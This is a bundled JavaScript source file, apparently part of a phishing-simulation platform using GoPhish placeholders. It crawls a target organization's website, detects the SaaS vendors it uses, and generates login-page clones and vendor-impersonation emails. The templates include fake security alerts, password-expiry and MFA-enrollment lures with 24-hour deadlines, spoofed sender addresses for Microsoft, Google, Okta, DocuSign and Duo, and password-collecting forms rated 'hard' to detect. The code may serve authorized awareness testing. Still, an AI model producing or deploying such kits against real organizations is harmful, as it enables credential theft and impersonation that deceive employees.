import "./chunk-KFQGP6VL.js";

// server/lib/crawl-phish-generator.ts
var VENDOR_PATTERNS = [
  {
    vendor: "Microsoft 365",
    vendorType: "sso",
    urlPatterns: [
      /login\.microsoftonline\.com/i,
      /outlook\.office365\.com/i,
      /outlook\.office\.com/i,
      /microsoft\.com\/.*login/i,
      /microsoftonline\.com/i,
      /azure\.com/i,
      /sharepoint\.com/i,
      /teams\.microsoft\.com/i,
      /graph\.microsoft\.com/i
    ],
    techPatterns: ["microsoft", "office 365", "azure", "sharepoint", "teams", "outlook"],
    headerPatterns: { "x-ms-": /x-ms-/i },
    phishingRelevance: "high"
  },
  {
    vendor: "Okta",
    vendorType: "sso",
    urlPatterns: [
      /\.okta\.com/i,
      /oktacdn\.com/i,
      /oktapreview\.com/i
    ],
    techPatterns: ["okta"],
    headerPatterns: {},
    phishingRelevance: "high"
  },
  {
    vendor: "Google Workspace",
    vendorType: "sso",
    urlPatterns: [
      /accounts\.google\.com/i,
      /googleapis\.com/i,
      /google\.com\/.*signin/i,
      /workspace\.google\.com/i,
      /mail\.google\.com/i
    ],
    techPatterns: ["google workspace", "gmail", "google apps"],
    headerPatterns: {},
    phishingRelevance: "high"
  },
  {
    vendor: "Salesforce",
    vendorType: "crm",
    urlPatterns: [
      /\.salesforce\.com/i,
      /force\.com/i,
      /salesforceiq\.com/i,
      /lightning\.force\.com/i
    ],
    techPatterns: ["salesforce"],
    headerPatterns: {},
    phishingRelevance: "high"
  },
  {
    vendor: "AWS",
    vendorType: "cloud",
    urlPatterns: [
      /\.amazonaws\.com/i,
      /aws\.amazon\.com/i,
      /cloudfront\.net/i,
      /s3\.amazonaws\.com/i
    ],
    techPatterns: ["amazon web services", "aws", "cloudfront"],
    headerPatterns: { "x-amz-": /x-amz-/i },
    phishingRelevance: "medium"
  },
  {
    vendor: "Cloudflare",
    vendorType: "cdn",
    urlPatterns: [
      /cloudflare\.com/i,
      /cdnjs\.cloudflare\.com/i
    ],
    techPatterns: ["cloudflare"],
    headerPatterns: { "cf-ray": /cf-ray/i, "cf-cache-status": /cf-cache-status/i },
    phishingRelevance: "low"
  },
  {
    vendor: "Slack",
    vendorType: "collaboration",
    urlPatterns: [
      /\.slack\.com/i,
      /slack-edge\.com/i,
      /slack-imgs\.com/i
    ],
    techPatterns: ["slack"],
    headerPatterns: {},
    phishingRelevance: "high"
  },
  {
    vendor: "Zoom",
    vendorType: "collaboration",
    urlPatterns: [
      /\.zoom\.us/i,
      /zoom\.com/i
    ],
    techPatterns: ["zoom"],
    headerPatterns: {},
    phishingRelevance: "medium"
  },
  {
    vendor: "HubSpot",
    vendorType: "crm",
    urlPatterns: [
      /\.hubspot\.com/i,
      /hs-analytics\.net/i,
      /hsforms\.com/i,
      /hubapi\.com/i
    ],
    techPatterns: ["hubspot"],
    headerPatterns: {},
    phishingRelevance: "medium"
  },
  {
    vendor: "Zendesk",
    vendorType: "crm",
    urlPatterns: [
      /\.zendesk\.com/i,
      /zdassets\.com/i
    ],
    techPatterns: ["zendesk"],
    headerPatterns: {},
    phishingRelevance: "medium"
  },
  {
    vendor: "Duo Security",
    vendorType: "security",
    urlPatterns: [
      /\.duosecurity\.com/i,
      /duo\.com/i
    ],
    techPatterns: ["duo", "duo security"],
    headerPatterns: {},
    phishingRelevance: "high"
  },
  {
    vendor: "OneLogin",
    vendorType: "sso",
    urlPatterns: [
      /\.onelogin\.com/i
    ],
    techPatterns: ["onelogin"],
    headerPatterns: {},
    phishingRelevance: "high"
  },
  {
    vendor: "Auth0",
    vendorType: "sso",
    urlPatterns: [
      /\.auth0\.com/i,
      /cdn\.auth0\.com/i
    ],
    techPatterns: ["auth0"],
    headerPatterns: {},
    phishingRelevance: "high"
  },
  {
    vendor: "ServiceNow",
    vendorType: "collaboration",
    urlPatterns: [
      /\.service-now\.com/i,
      /servicenow\.com/i
    ],
    techPatterns: ["servicenow"],
    headerPatterns: {},
    phishingRelevance: "medium"
  },
  {
    vendor: "Jira / Atlassian",
    vendorType: "collaboration",
    urlPatterns: [
      /\.atlassian\.com/i,
      /\.atlassian\.net/i,
      /jira\..*\.com/i,
      /confluence\..*\.com/i
    ],
    techPatterns: ["jira", "confluence", "atlassian", "bitbucket"],
    headerPatterns: {},
    phishingRelevance: "medium"
  },
  {
    vendor: "DocuSign",
    vendorType: "collaboration",
    urlPatterns: [
      /\.docusign\.com/i,
      /\.docusign\.net/i
    ],
    techPatterns: ["docusign"],
    headerPatterns: {},
    phishingRelevance: "high"
  }
];
function extractBranding(crawlResult) {
  const domain = crawlResult.domain;
  const pageTitle = crawlResult.pageTitle || domain;
  const resources = crawlResult.resourceUrls || [];
  const logoUrls = resources.filter((url) => {
    const lower = url.toLowerCase();
    return lower.includes("logo") || lower.includes("brand") || lower.includes("icon");
  }).slice(0, 5);
  const faviconUrl = resources.find((url) => {
    const lower = url.toLowerCase();
    return lower.includes("favicon") || lower.includes("icon") || lower.endsWith(".ico");
  }) || null;
  const companyName = inferCompanyName(pageTitle, domain);
  return {
    domain,
    pageTitle,
    logoUrls,
    faviconUrl,
    primaryColor: null,
    // Would need CSS parsing for accurate extraction
    accentColor: null,
    fontFamily: null,
    companyName,
    metaDescription: crawlResult.metaDescription || ""
  };
}
function inferCompanyName(pageTitle, domain) {
  const separators = [" - ", " | ", " \u2014 ", " \xB7 ", " :: "];
  for (const sep of separators) {
    if (pageTitle.includes(sep)) {
      const parts = pageTitle.split(sep);
      const candidate = parts[parts.length - 1].trim();
      if (candidate.length > 2 && candidate.length < 60) return candidate;
      const first = parts[0].trim();
      if (first.length > 2 && first.length < 60) return first;
    }
  }
  const domainParts = domain.replace(/^www\./, "").split(".");
  return domainParts[0].charAt(0).toUpperCase() + domainParts[0].slice(1);
}
function detectVendors(crawlResult) {
  const vendors = [];
  const externalLinks = crawlResult.externalLinks || [];
  const resourceUrls = crawlResult.resourceUrls || [];
  const allUrls = [...externalLinks, ...resourceUrls];
  const technologies = crawlResult.detectedTechnologies || [];
  const headers = crawlResult.rawHeaders || {};
  for (const pattern of VENDOR_PATTERNS) {
    const evidence = [];
    let confidence = 0;
    for (const url of allUrls) {
      for (const regex of pattern.urlPatterns) {
        if (regex.test(url)) {
          evidence.push(`URL reference: ${url.substring(0, 120)}`);
          confidence += 30;
          break;
        }
      }
      if (evidence.length > 3) break;
    }
    for (const tech of technologies) {
      for (const techPattern of pattern.techPatterns) {
        if (tech.name.toLowerCase().includes(techPattern.toLowerCase())) {
          evidence.push(`Technology detected: ${tech.name}`);
          confidence += 25;
          break;
        }
      }
    }
    for (const [headerName, headerRegex] of Object.entries(pattern.headerPatterns)) {
      for (const [key] of Object.entries(headers)) {
        if (headerRegex.test(key)) {
          evidence.push(`Response header: ${key}`);
          confidence += 15;
          break;
        }
      }
    }
    if (evidence.length > 0) {
      vendors.push({
        vendor: pattern.vendor,
        vendorType: pattern.vendorType,
        confidence: Math.min(100, confidence),
        evidence: evidence.slice(0, 5),
        phishingRelevance: pattern.phishingRelevance,
        templateAvailable: ["Microsoft 365", "Google Workspace", "Okta", "Salesforce", "Slack", "DocuSign", "Jira / Atlassian", "Duo Security"].includes(pattern.vendor)
      });
    }
  }
  vendors.sort((a, b) => b.confidence - a.confidence);
  return vendors;
}
function generateLoginCloneTemplate(params) {
  const { form, branding, sourceUrl, vendorMatch } = params;
  const templateId = `clone_${branding.domain.replace(/\./g, "_")}_${Date.now()}`;
  const formFieldsHtml = form.inputs.filter((inp) => inp.name && inp.type !== "hidden" && inp.type !== "submit").map((inp) => {
    const label = inp.name.replace(/[_-]/g, " ").replace(/\b\w/g, (c) => c.toUpperCase());
    const inputType = inp.type === "password" ? "password" : inp.type === "email" ? "email" : "text";
    return `      <div style="margin-bottom:16px;">
        <label style="display:block;font-size:13px;color:#5e6c84;margin-bottom:6px;font-weight:500;">${label}</label>
        <input type="${inputType}" name="${inp.name}" placeholder="${label}" required
          style="width:100%;padding:10px 12px;border:1px solid #dfe1e6;border-radius:4px;font-size:14px;box-sizing:border-box;outline:none;transition:border-color 0.2s;"
          onfocus="this.style.borderColor='#0052cc'" onblur="this.style.borderColor='#dfe1e6'">
      </div>`;
  }).join("\n");
  const landingPageHtml = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${branding.pageTitle || branding.companyName + " - Sign In"}</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      background: #f4f5f7;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .login-container {
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.08);
      padding: 40px;
      width: 100%;
      max-width: 400px;
    }
    .logo-area {
      text-align: center;
      margin-bottom: 32px;
    }
    .logo-area img {
      max-height: 40px;
      margin-bottom: 12px;
    }
    .logo-area h1 {
      font-size: 22px;
      font-weight: 600;
      color: #172b4d;
    }
    .logo-area p {
      font-size: 14px;
      color: #6b778c;
      margin-top: 4px;
    }
    .submit-btn {
      width: 100%;
      padding: 10px;
      background: #0052cc;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
    }
    .submit-btn:hover { background: #0747a6; }
    .footer-links {
      text-align: center;
      margin-top: 20px;
      font-size: 13px;
      color: #6b778c;
    }
    .footer-links a {
      color: #0052cc;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo-area">
      ${branding.logoUrls.length > 0 ? `<img src="${branding.logoUrls[0]}" alt="${branding.companyName}">` : ""}
      <h1>${branding.companyName}</h1>
      <p>Sign in to your account</p>
    </div>
    <form method="POST" action="{{.URL}}">
${formFieldsHtml}
      <button type="submit" class="submit-btn">Sign In</button>
    </form>
    <div class="footer-links">
      <a href="#">Forgot password?</a> &middot; <a href="#">Need help?</a>
    </div>
  </div>
  <img src="{{.TrackingURL}}" style="display:none" alt="">
</body>
</html>`;
  const emailHtml = generateLoginPhishEmail(branding, vendorMatch);
  return {
    id: templateId,
    name: `${branding.companyName} Login Portal Clone`,
    type: "login_clone",
    category: "credential_harvesting",
    subject: `Action Required: Verify Your ${branding.companyName} Account`,
    senderName: `${branding.companyName} Security`,
    senderEmail: `security@${branding.domain}`,
    emailHtml,
    landingPageHtml,
    targetPersona: "All employees",
    pretext: `Mimics the actual ${branding.companyName} login portal discovered at ${sourceUrl}. Form structure matches the real login page.`,
    urgencyLevel: "high",
    detectionDifficulty: "hard",
    mitreId: "T1566.002",
    mitreName: "Phishing: Spearphishing Link",
    sourceUrl,
    sourceDomain: branding.domain,
    vendorMatch: vendorMatch || null,
    generatedAt: Date.now()
  };
}
function generateLoginPhishEmail(branding, vendorMatch) {
  const companyName = branding.companyName;
  return `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f4f5f7;">
  <div style="max-width:600px;margin:0 auto;padding:20px;">
    <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
      <!-- Header -->
      <div style="background:#0052cc;padding:24px 30px;">
        ${branding.logoUrls.length > 0 ? `<img src="${branding.logoUrls[0]}" alt="${companyName}" style="height:28px;filter:brightness(10);">` : `<span style="color:#fff;font-size:20px;font-weight:700;">${companyName}</span>`}
      </div>
      <!-- Body -->
      <div style="padding:30px;">
        <h2 style="font-size:20px;color:#172b4d;margin-bottom:16px;">Account Verification Required</h2>
        <p style="font-size:14px;color:#5e6c84;line-height:1.6;margin-bottom:16px;">
          We detected unusual activity on your ${companyName} account. As a security precaution, please verify your identity by signing in below.
        </p>
        <p style="font-size:14px;color:#5e6c84;line-height:1.6;margin-bottom:24px;">
          This verification is required within <strong>24 hours</strong> to prevent account suspension.
        </p>
        <div style="text-align:center;margin:24px 0;">
          <a href="{{.URL}}" style="display:inline-block;padding:12px 32px;background:#0052cc;color:#fff;text-decoration:none;border-radius:4px;font-size:15px;font-weight:600;">
            Verify My Account
          </a>
        </div>
        <p style="font-size:12px;color:#97a0af;line-height:1.5;margin-top:24px;">
          If you did not request this verification, please contact ${companyName} IT Support immediately.
        </p>
      </div>
      <!-- Footer -->
      <div style="background:#f4f5f7;padding:16px 30px;border-top:1px solid #dfe1e6;">
        <p style="font-size:11px;color:#97a0af;text-align:center;">
          &copy; ${(/* @__PURE__ */ new Date()).getFullYear()} ${companyName}. All rights reserved.<br>
          This is an automated security notification.
        </p>
      </div>
    </div>
  </div>
</body>
</html>`;
}
function generateSupplyChainTemplates(params) {
  const { vendors, branding } = params;
  const templates = [];
  for (const vendor of vendors) {
    if (vendor.confidence < 30 || vendor.phishingRelevance === "low") continue;
    const vendorTemplateConfig = VENDOR_TEMPLATE_CONFIGS[vendor.vendor];
    if (!vendorTemplateConfig) continue;
    const templateId = `supply_chain_${vendor.vendor.replace(/\s+/g, "_").toLowerCase()}_${branding.domain.replace(/\./g, "_")}_${Date.now()}`;
    const emailHtml = generateVendorPhishEmail(vendor, branding, vendorTemplateConfig);
    const landingPageHtml = generateVendorLandingPage(vendor, branding, vendorTemplateConfig);
    templates.push({
      id: templateId,
      name: `${vendor.vendor} \u2014 ${vendorTemplateConfig.scenario} (${branding.companyName})`,
      type: "supply_chain",
      category: "vendor_impersonation",
      subject: vendorTemplateConfig.subject.replace("{{company}}", branding.companyName),
      senderName: vendorTemplateConfig.senderName,
      senderEmail: vendorTemplateConfig.senderEmail,
      emailHtml,
      landingPageHtml,
      targetPersona: vendorTemplateConfig.targetPersona,
      pretext: `Impersonates ${vendor.vendor} communications. Target org confirmed using ${vendor.vendor} (confidence: ${vendor.confidence}%). Evidence: ${vendor.evidence[0]}`,
      urgencyLevel: vendorTemplateConfig.urgencyLevel,
      detectionDifficulty: vendorTemplateConfig.detectionDifficulty,
      mitreId: "T1566.002",
      mitreName: "Phishing: Spearphishing Link",
      sourceUrl: vendor.evidence[0] || "",
      sourceDomain: branding.domain,
      vendorMatch: vendor.vendor,
      generatedAt: Date.now()
    });
  }
  return templates;
}
var VENDOR_TEMPLATE_CONFIGS = {
  "Microsoft 365": {
    scenario: "Account Security Alert",
    subject: "Unusual sign-in activity on your {{company}} Microsoft account",
    senderName: "Microsoft Account Team",
    senderEmail: "account-security@microsoft.com",
    targetPersona: "All Microsoft 365 users",
    urgencyLevel: "high",
    detectionDifficulty: "hard",
    emailBodyIntro: "We detected a sign-in attempt from an unrecognized device on your Microsoft 365 account associated with your organization.",
    emailBodyAction: "Please review this activity and verify your identity to keep your account secure.",
    buttonText: "Review Recent Activity",
    brandColor: "#0078d4",
    logoUrl: "https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
  },
  "Google Workspace": {
    scenario: "Security Alert",
    subject: "Security alert for your {{company}} Google account",
    senderName: "Google",
    senderEmail: "no-reply@accounts.google.com",
    targetPersona: "All Google Workspace users",
    urgencyLevel: "high",
    detectionDifficulty: "hard",
    emailBodyIntro: "Someone just used your password to try to sign in to your Google Account. Google blocked the sign-in attempt.",
    emailBodyAction: "Check activity and secure your account now.",
    buttonText: "Check Activity",
    brandColor: "#1a73e8",
    logoUrl: "https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png"
  },
  "Okta": {
    scenario: "Password Expiration Notice",
    subject: "Your {{company}} SSO password expires in 24 hours",
    senderName: "Okta Admin",
    senderEmail: "noreply@okta.com",
    targetPersona: "All SSO users",
    urgencyLevel: "high",
    detectionDifficulty: "hard",
    emailBodyIntro: "Your single sign-on password for your organization's Okta portal is set to expire within the next 24 hours.",
    emailBodyAction: "Please update your password now to avoid losing access to your applications.",
    buttonText: "Update Password",
    brandColor: "#007dc1",
    logoUrl: ""
  },
  "Salesforce": {
    scenario: "Verify Your Identity",
    subject: "Salesforce: Verify your identity for {{company}}",
    senderName: "Salesforce",
    senderEmail: "noreply@salesforce.com",
    targetPersona: "Sales and CRM users",
    urgencyLevel: "medium",
    detectionDifficulty: "moderate",
    emailBodyIntro: "A new device was used to log in to your Salesforce account. For your security, we need to verify your identity.",
    emailBodyAction: "Click below to verify your identity and authorize this device.",
    buttonText: "Verify Identity",
    brandColor: "#00a1e0",
    logoUrl: ""
  },
  "Slack": {
    scenario: "Workspace Access Update",
    subject: "Action needed: Re-authenticate your {{company}} Slack workspace",
    senderName: "Slack",
    senderEmail: "feedback@slack.com",
    targetPersona: "All Slack users",
    urgencyLevel: "medium",
    detectionDifficulty: "moderate",
    emailBodyIntro: "Due to a security policy update in your organization's Slack workspace, all members need to re-authenticate their accounts.",
    emailBodyAction: "Please sign in again to continue accessing your workspace.",
    buttonText: "Sign In to Slack",
    brandColor: "#4a154b",
    logoUrl: ""
  },
  "DocuSign": {
    scenario: "Document Signature Request",
    subject: "{{company}} sent you a document to review and sign",
    senderName: "DocuSign",
    senderEmail: "dse@docusign.net",
    targetPersona: "Executives and managers",
    urgencyLevel: "medium",
    detectionDifficulty: "hard",
    emailBodyIntro: "A document has been sent to you for your electronic signature. Please review and sign the document at your earliest convenience.",
    emailBodyAction: "Click below to review and sign the document.",
    buttonText: "Review Document",
    brandColor: "#4c00ff",
    logoUrl: ""
  },
  "Jira / Atlassian": {
    scenario: "Shared Issue Notification",
    subject: "[JIRA] {{company}} \u2014 Critical issue assigned to you",
    senderName: "Jira",
    senderEmail: "jira@atlassian.com",
    targetPersona: "Engineering and IT staff",
    urgencyLevel: "medium",
    detectionDifficulty: "moderate",
    emailBodyIntro: "A critical issue has been assigned to you in your organization's Jira project. Immediate attention is required.",
    emailBodyAction: "Click below to view the issue details and take action.",
    buttonText: "View Issue",
    brandColor: "#0052cc",
    logoUrl: ""
  },
  "Duo Security": {
    scenario: "MFA Enrollment Required",
    subject: "{{company}} requires Duo MFA enrollment \u2014 action needed",
    senderName: "Duo Security",
    senderEmail: "noreply@duosecurity.com",
    targetPersona: "All employees",
    urgencyLevel: "high",
    detectionDifficulty: "hard",
    emailBodyIntro: "Your organization has updated its multi-factor authentication policy. You must enroll a new device in Duo Security within the next 48 hours.",
    emailBodyAction: "Click below to complete your MFA enrollment.",
    buttonText: "Enroll Now",
    brandColor: "#6dc04b",
    logoUrl: ""
  }
};
function generateVendorPhishEmail(vendor, branding, config) {
  return `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f4f5f7;">
  <div style="max-width:600px;margin:0 auto;padding:20px;">
    <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
      <!-- Vendor Header -->
      <div style="background:${config.brandColor};padding:20px 30px;text-align:center;">
        ${config.logoUrl ? `<img src="${config.logoUrl}" alt="${vendor.vendor}" style="height:28px;">` : `<span style="color:#fff;font-size:18px;font-weight:700;">${vendor.vendor}</span>`}
      </div>
      <!-- Body -->
      <div style="padding:30px;">
        <p style="font-size:14px;color:#333;line-height:1.6;margin-bottom:16px;">
          Hi {{.FirstName}},
        </p>
        <p style="font-size:14px;color:#333;line-height:1.6;margin-bottom:16px;">
          ${config.emailBodyIntro}
        </p>
        <p style="font-size:14px;color:#333;line-height:1.6;margin-bottom:24px;">
          ${config.emailBodyAction}
        </p>
        <div style="text-align:center;margin:24px 0;">
          <a href="{{.URL}}" style="display:inline-block;padding:12px 32px;background:${config.brandColor};color:#fff;text-decoration:none;border-radius:4px;font-size:15px;font-weight:600;">
            ${config.buttonText}
          </a>
        </div>
        <p style="font-size:12px;color:#999;line-height:1.5;margin-top:24px;">
          If you did not initiate this action, please contact your IT administrator at ${branding.companyName} immediately.
        </p>
      </div>
      <!-- Footer -->
      <div style="background:#f9f9f9;padding:16px 30px;border-top:1px solid #eee;">
        <p style="font-size:11px;color:#999;text-align:center;">
          This message was sent by ${vendor.vendor} on behalf of ${branding.companyName}.<br>
          &copy; ${(/* @__PURE__ */ new Date()).getFullYear()} ${vendor.vendor}. All rights reserved.
        </p>
      </div>
    </div>
  </div>
  <!-- GoPhish tracking pixel -->
  <img src="{{.TrackingURL}}" style="display:none;" alt="">
</body>
</html>`;
}
function generateVendorLandingPage(vendor, branding, config) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${vendor.vendor} \u2014 Sign In</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #f4f5f7;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .login-box {
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.08);
      padding: 40px;
      width: 100%;
      max-width: 400px;
    }
    .vendor-logo {
      text-align: center;
      margin-bottom: 28px;
    }
    .vendor-logo img { max-height: 32px; }
    .vendor-logo h2 {
      font-size: 20px;
      font-weight: 600;
      color: #172b4d;
      margin-top: 12px;
    }
    .vendor-logo p {
      font-size: 13px;
      color: #6b778c;
      margin-top: 4px;
    }
    .form-group {
      margin-bottom: 16px;
    }
    .form-group label {
      display: block;
      font-size: 13px;
      color: #5e6c84;
      margin-bottom: 6px;
      font-weight: 500;
    }
    .form-group input {
      width: 100%;
      padding: 10px 12px;
      border: 1px solid #dfe1e6;
      border-radius: 4px;
      font-size: 14px;
      outline: none;
      transition: border-color 0.2s;
    }
    .form-group input:focus { border-color: ${config.brandColor}; }
    .submit-btn {
      width: 100%;
      padding: 10px;
      background: ${config.brandColor};
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 8px;
    }
    .submit-btn:hover { opacity: 0.9; }
    .org-badge {
      text-align: center;
      margin-bottom: 20px;
      padding: 8px 16px;
      background: #f0f4ff;
      border-radius: 4px;
      font-size: 13px;
      color: #333;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="vendor-logo">
      ${config.logoUrl ? `<img src="${config.logoUrl}" alt="${vendor.vendor}">` : `<h2 style="color:${config.brandColor};">${vendor.vendor}</h2>`}
      <p>Sign in to continue</p>
    </div>
    <div class="org-badge">
      Signing in to <strong>${branding.companyName}</strong>
    </div>
    <form method="POST" action="">
      <div class="form-group">
        <label>Email</label>
        <input type="email" name="email" placeholder="you@${branding.domain}" required>
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" name="password" placeholder="Enter your password" required>
      </div>
      <button type="submit" class="submit-btn">${config.buttonText}</button>
    </form>
    <div style="text-align:center;margin-top:16px;font-size:13px;color:#6b778c;">
      <a href="#" style="color:${config.brandColor};text-decoration:none;">Forgot password?</a>
    </div>
  </div>
</body>
</html>`;
}
async function generatePhishingFromCrawl(params) {
  const { scanId, domain, crawlResults } = params;
  const primaryResult = crawlResults.find((r) => r.domain === domain) || crawlResults[0];
  const branding = primaryResult ? extractBranding(primaryResult) : {
    domain,
    pageTitle: domain,
    logoUrls: [],
    faviconUrl: null,
    primaryColor: null,
    accentColor: null,
    fontFamily: null,
    companyName: domain.split(".")[0],
    metaDescription: ""
  };
  const allVendors = /* @__PURE__ */ new Map();
  for (const result of crawlResults) {
    const vendors = detectVendors(result);
    for (const v of vendors) {
      const existing = allVendors.get(v.vendor);
      if (!existing || v.confidence > existing.confidence) {
        allVendors.set(v.vendor, v);
      }
    }
  }
  const detectedVendors = Array.from(allVendors.values()).sort((a, b) => b.confidence - a.confidence);
  const loginForms = [];
  for (const result of crawlResults) {
    const forms = result.forms || [];
    for (const form of forms) {
      if (form.hasPasswordField) {
        loginForms.push({
          url: result.targetUrl,
          form,
          pageTitle: result.pageTitle || result.domain
        });
      }
    }
  }
  const generatedTemplates = [];
  for (const loginForm of loginForms.slice(0, 5)) {
    const vendorMatch = detectedVendors.find((v) => v.vendorType === "sso")?.vendor;
    generatedTemplates.push(generateLoginCloneTemplate({
      form: loginForm.form,
      branding,
      sourceUrl: loginForm.url,
      vendorMatch
    }));
  }
  const supplyChainTemplates = generateSupplyChainTemplates({
    vendors: detectedVendors,
    branding
  });
  generatedTemplates.push(...supplyChainTemplates);
  const supplyChainRisks = [];
  for (const vendor of detectedVendors) {
    if (vendor.phishingRelevance === "high") {
      supplyChainRisks.push(`${vendor.vendor} (${vendor.vendorType}) \u2014 ${vendor.evidence[0]}`);
    }
  }
  return {
    scanId,
    domain,
    branding,
    detectedVendors,
    loginForms,
    generatedTemplates,
    supplyChainRisks
  };
}
export {
  detectVendors,
  extractBranding,
  generateLoginCloneTemplate,
  generatePhishingFromCrawl,
  generateSupplyChainTemplates
};
